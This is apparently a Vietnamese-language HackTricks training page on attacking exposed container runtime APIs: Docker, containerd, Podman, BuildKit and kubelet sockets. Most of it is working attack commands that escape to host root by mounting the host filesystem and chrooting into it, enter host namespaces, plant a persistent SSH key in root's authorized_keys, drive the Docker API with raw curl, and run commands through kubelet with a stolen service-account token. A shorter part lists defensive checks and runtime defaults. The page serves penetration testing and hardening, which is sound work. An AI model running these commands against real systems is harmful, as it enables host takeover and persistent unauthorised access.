# Runtime API Và Mức Độ Phơi Lộ Daemon

{{#include ../../../banners/hacktricks-training.md}}

## Tổng quan

Nhiều vụ xâm nhập container thực tế không bắt đầu bằng việc thoát khỏi namespace. Chúng bắt đầu từ quyền truy cập vào control plane của runtime. Nếu workload có thể giao tiếp với `dockerd`, `containerd`, CRI-O, Podman hoặc kubelet thông qua Unix socket được mount hoặc TCP listener được mở, kẻ tấn công có thể yêu cầu tạo container mới với đặc quyền cao hơn, mount filesystem của host, tham gia các namespace của host hoặc lấy thông tin nhạy cảm về node. Trong những trường hợp đó, runtime API chính là ranh giới bảo mật thực sự, và xâm nhập được API này về cơ bản gần như tương đương với xâm nhập host.

Đó là lý do việc để lộ runtime socket cần được ghi nhận riêng với các biện pháp bảo vệ kernel. Container có seccomp, capabilities và MAC confinement thông thường vẫn có thể chỉ cách việc xâm nhập host một API call nếu `/var/run/docker.sock` hoặc `/run/containerd/containerd.sock` được mount bên trong container. Cơ chế cách ly của kernel đối với container hiện tại có thể đang hoạt động đúng như thiết kế, trong khi management plane của runtime vẫn hoàn toàn bị lộ.

## Các mô hình truy cập daemon

Docker Engine theo truyền thống cung cấp API có đặc quyền thông qua Unix socket cục bộ tại `unix:///var/run/docker.sock`. Trước đây, API này cũng được mở từ xa qua các TCP listener như `tcp://0.0.0.0:2375` hoặc listener được bảo vệ bằng TLS trên cổng `2376`. Mở daemon từ xa mà không có TLS mạnh và xác thực client về cơ bản biến Docker API thành giao diện root từ xa.

containerd, CRI-O, Podman và kubelet cũng để lộ các bề mặt có tác động lớn tương tự. Tên gọi và quy trình khác nhau, nhưng logic thì không. Nếu giao diện cho phép caller tạo workload, mount đường dẫn host, lấy thông tin xác thực hoặc thay đổi container đang chạy, thì đây là một kênh quản lý có đặc quyền và cần được xử lý tương ứng.

Giao diện web quản lý container có thể để lộ cùng ranh giới này mà không cần cấp cho tài khoản cục bộ quyền truy cập trực tiếp vào socket. Ví dụ, [Portainer issue #493](https://github.com/portainer/portainer/issues/493) ghi nhận việc đặt lại mật khẩu administrator không cần xác thực trong bản 1.11.1 cũ. Chỉ xem UI có thể truy cập cục bộ là một đầu mối cần kiểm tra: hãy xác nhận bản cài đặt và hành vi xác thực, quyền kiểm soát thực tế của administrator, cũng như liệu endpoint được quản lý có thể tạo container với host bind mount có quyền ghi hay không. [Tài liệu Portainer](https://docs.portainer.io/admin/environments/add/docker/socket) nêu rằng việc quản lý dựa trên socket cần quyền truy cập Docker socket; endpoint rootless hoặc bị giới hạn sẽ làm thay đổi mức độ ảnh hưởng đến host. Đừng suy luận rằng có lỗ hổng xác thực hoặc quyền truy cập root trên host chỉ dựa vào tên tiến trình, cổng hoặc chuỗi phiên bản.

Các đường dẫn cục bộ thường cần kiểm tra gồm:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```

Các stack cũ hơn hoặc chuyên biệt hơn cũng có thể công khai các endpoint như `dockershim.sock`, `frakti.sock` hoặc `rktlet.sock`. Những endpoint này ít phổ biến hơn trong các môi trường hiện đại, nhưng khi gặp phải, cần thận trọng tương tự vì chúng là các giao diện điều khiển runtime chứ không phải socket ứng dụng thông thường.

## Truy cập từ xa an toàn

Nếu daemon phải được công khai bên ngoài socket cục bộ, kết nối cần được bảo vệ bằng TLS và tốt nhất là dùng xác thực hai chiều để daemon xác minh client và client xác minh daemon. Thói quen cũ là mở Docker daemon qua HTTP thuần cho tiện lợi là một trong những sai lầm nguy hiểm nhất trong quản trị container, vì bề mặt API đủ mạnh để trực tiếp tạo các container có đặc quyền.

Mẫu cấu hình Docker trước đây như sau:

```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```

Trên các host sử dụng systemd, giao tiếp với daemon cũng có thể xuất hiện dưới dạng `fd://`, nghĩa là tiến trình kế thừa một socket đã được systemd mở sẵn thay vì tự bind trực tiếp. Bài học quan trọng không nằm ở cú pháp chính xác mà ở hệ quả bảo mật. Ngay khi daemon lắng nghe trên một địa chỉ ngoài socket cục bộ được giới hạn quyền chặt chẽ, bảo mật truyền tải và xác thực client trở thành yêu cầu bắt buộc, thay vì chỉ là biện pháp hardening tùy chọn.

## Lạm dụng

Nếu có runtime socket, hãy xác nhận đó là socket nào, có client tương thích hay không và có thể truy cập HTTP hoặc gRPC trực tiếp hay không:

```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```

Các lệnh này hữu ích vì chúng phân biệt được giữa một đường dẫn không hoạt động, một socket đã được mount nhưng không thể truy cập và một API đang hoạt động với đặc quyền cao. Nếu client kết nối thành công, câu hỏi tiếp theo là API có thể khởi chạy container mới với bind mount của host hoặc chia sẻ namespace của host hay không.

### Khi Không Cài Đặt Client

Không có `docker`, `podman` hoặc một CLI thuận tiện khác không có nghĩa là socket an toàn. Docker Engine giao tiếp qua HTTP trên Unix socket, còn Podman cung cấp cả API tương thích với Docker lẫn API gốc Libpod thông qua `podman system service`. Điều đó có nghĩa là một môi trường tối giản chỉ có `curl` vẫn có thể đủ để điều khiển daemon:

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
  -X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```

Đối với việc thực thi mã PHP bị giới hạn bởi `open_basedir`, [kết nối Unix socket vẫn là một đường truy cập riêng](../../../network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/#unix-sockets-outside-open_basedir) nếu tiến trình PHP có quyền ở cấp OS để kết nối.

Điều này quan trọng trong quá trình post-exploitation vì đôi khi các defender xóa những client binary thường dùng nhưng vẫn để management socket được mount. Trên host Podman, hãy nhớ rằng đường dẫn có giá trị cao khác nhau giữa các triển khai rootful và rootless: `unix:///run/podman/podman.sock` đối với các instance dịch vụ rootful và `unix://$XDG_RUNTIME_DIR/podman/podman.sock` đối với các instance rootless.

### Ví dụ đầy đủ: Docker Socket dẫn đến quyền root trên host

Nếu có thể truy cập `docker.sock`, cách escape kinh điển là khởi chạy một container mới, mount filesystem gốc của host rồi `chroot` vào đó:

```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```

Điều này cho phép thực thi trực tiếp với quyền root trên máy chủ thông qua Docker daemon. Tác động không chỉ giới hạn ở việc đọc tệp. Khi đã ở trong container mới, kẻ tấn công có thể chỉnh sửa tệp trên máy chủ, thu thập thông tin xác thực, cài đặt cơ chế duy trì quyền truy cập hoặc khởi chạy thêm các workload có đặc quyền.

### Ví dụ đầy đủ: Từ Docker Socket đến các namespace của máy chủ

Nếu kẻ tấn công muốn vào namespace thay vì chỉ truy cập hệ thống tệp:

```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

Đường dẫn này tiếp cận host bằng cách yêu cầu runtime tạo container mới với quyền truy cập tường minh vào namespace của host, thay vì khai thác container hiện tại.

### Mẫu Persistence qua Docker Socket

Có thể dùng quyền kiểm soát runtime để duy trì persistence thay vì chỉ mở shell một lần. Mẫu chung là tạo một helper container có mount tới host, ghi thông tin truy cập được ủy quyền hoặc startup hook vào filesystem của host được mount, rồi xác minh host có sử dụng nó hay không.

Ví dụ:

```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```

Cùng ý tưởng này có thể nhắm đến các unit systemd, cron fragment, tệp khởi động ứng dụng hoặc SSH key, tùy vào điều operator muốn chứng minh. Điểm quan trọng là thay đổi bền vững được thực hiện thông qua quyền truy cập filesystem ở cấp host của runtime daemon, chứ không phải nhờ thêm đặc quyền trong container ban đầu.

### Pivot bằng helper qua Docker API thô

Khi thiếu Docker CLI, có thể thực hiện cùng quy trình dùng helper với host-mount thông qua HTTP trên Unix socket. Quy trình chung là: xác nhận API, tạo container helper với host bind mount, khởi động container, tạo một exec instance rồi khởi động exec đó.

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
  -X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
  -X POST http://localhost/v1.54/containers/helper/exec
```

Yêu cầu `/exec/<id>/start` cuối cùng phụ thuộc vào exec ID được trả về, nhưng điểm bảo mật không phụ thuộc vào cách xử lý JSON cụ thể: chỉ cần truy cập API thô vào Docker daemon chạy với quyền root là đủ để yêu cầu một workload hỗ trợ có quyền cao hơn.

### Ví dụ đầy đủ: Socket containerd

Socket `containerd` được mount thường cũng nguy hiểm tương tự:<sup>[[1]](#references)</sup>

```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```

Nếu có một client giống Docker hơn, `nerdctl` có thể tiện dụng hơn `ctr` vì hỗ trợ các flag quen thuộc như `--privileged`, `--pid=host` và `-v`:

```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
  --privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```

Tác động vẫn là host compromise. Ngay cả khi không có công cụ dành riêng cho Docker, một runtime API khác vẫn có thể cung cấp quyền quản trị tương tự. Trên các node Kubernetes, `crictl` cũng có thể đủ để reconnaissance và tương tác với container vì nó giao tiếp trực tiếp với endpoint CRI.

### BuildKit Socket

`buildkitd` rất dễ bị bỏ sót vì mọi người thường nghĩ nó “chỉ là backend build”, nhưng daemon này vẫn là một control plane có đặc quyền. Nếu truy cập được `buildkitd.sock`, attacker có thể chạy các bước build tùy ý, kiểm tra khả năng của worker, dùng các context cục bộ từ môi trường đã bị xâm phạm và yêu cầu các entitlement nguy hiểm như `network.host` hoặc `security.insecure` nếu daemon được cấu hình cho phép.

Các tương tác đầu tiên hữu ích là:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```

Nếu daemon chấp nhận các yêu cầu build, hãy kiểm tra xem có các entitlements không an toàn hay không:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
  --frontend dockerfile.v0 \
  --local context=. \
  --local dockerfile=. \
  --allow network.host \
  --allow security.insecure \
  --output type=local,dest=/tmp/buildkit-out
```

Tác động chính xác phụ thuộc vào cấu hình daemon, nhưng dịch vụ BuildKit chạy rootful với entitlements được cấp quyền quá rộng không phải là tiện ích vô hại dành cho developer. Hãy xem đây là một bề mặt quản trị có giá trị cao khác, đặc biệt trên CI runner và các build node dùng chung.

### Kubelet API qua TCP

kubelet không phải là container runtime, nhưng vẫn thuộc mặt phẳng quản lý node và thường nằm trong cùng phạm vi ranh giới tin cậy. Nếu workload có thể truy cập cổng bảo mật của kubelet `10250`, hoặc thông tin xác thực của node, kubeconfig hay quyền proxy bị lộ, attacker có thể liệt kê Pod, truy xuất log hoặc thực thi lệnh trong các container cục bộ trên node mà không cần đi qua luồng admission của Kubernetes API server.

Bắt đầu bằng việc dò tìm nhanh:

```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```

Nếu kubelet hoặc đường dẫn proxy của API-server cho phép `exec`, một client hỗ trợ WebSocket có thể biến điều đó thành khả năng thực thi mã trong các container khác trên node. Đây cũng là lý do quyền `nodes/proxy` chỉ với quyền `get` nguy hiểm hơn vẻ ngoài: request vẫn có thể truy cập các endpoint của kubelet để thực thi lệnh, và những tương tác trực tiếp đó với kubelet không xuất hiện trong log kiểm tra Kubernetes thông thường.<sup>[[2]](#references)</sup>

## Checks

Mục tiêu của các bước kiểm tra này là xác định liệu container có thể truy cập bất kỳ mặt phẳng quản lý nào vốn phải nằm ngoài ranh giới tin cậy hay không.

```bash
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```

Điều đáng chú ý ở đây:

- Socket runtime được mount thường là một primitive quản trị trực tiếp, chứ không chỉ đơn thuần làm lộ thông tin.
- TCP listener trên `2375` không có TLS cần được xem là tình trạng có thể dẫn đến xâm nhập từ xa.
- Các biến môi trường như `DOCKER_HOST` thường cho thấy workload được thiết kế có chủ đích để giao tiếp với runtime của host.

## Mặc định của runtime

| Runtime / nền tảng | Trạng thái mặc định | Hành vi mặc định | Các cách làm suy yếu thường gặp |
| --- | --- | --- | --- |
| Docker Engine | Mặc định dùng Unix socket cục bộ | `dockerd` lắng nghe trên socket cục bộ và daemon thường chạy với quyền root | mount `/var/run/docker.sock`, mở `tcp://...:2375`, cấu hình TLS yếu hoặc không có TLS trên `2376` |
| Podman | Mặc định dùng CLI không cần daemon | Không cần daemon đặc quyền chạy lâu dài cho các tác vụ cục bộ thông thường; API socket vẫn có thể được mở khi bật `podman system service` | mở `podman.sock`, chạy service trên phạm vi rộng, dùng API với quyền root |
| containerd | Socket đặc quyền cục bộ | API quản trị được mở qua socket cục bộ và thường được các công cụ cấp cao hơn sử dụng | mount `containerd.sock`, cấp quyền truy cập `ctr` hoặc `nerdctl` trên phạm vi rộng, mở các namespace đặc quyền |
| CRI-O | Socket đặc quyền cục bộ | CRI endpoint dành cho các thành phần đáng tin cậy trên cùng node | mount `crio.sock`, mở CRI endpoint cho workload không đáng tin cậy |
| Kubernetes kubelet | API quản lý cục bộ trên node | Không nên để Pod truy cập kubelet trên phạm vi rộng; tùy theo cấu hình authn/authz, quyền truy cập có thể làm lộ trạng thái Pod, thông tin xác thực và các chức năng thực thi | mount socket hoặc chứng chỉ kubelet, xác thực kubelet yếu, dùng host networking cùng kubelet endpoint có thể truy cập được |

## References

- [1] [khai thác socket containerd phần 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Rủi ro bypass Kubernetes API Server](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
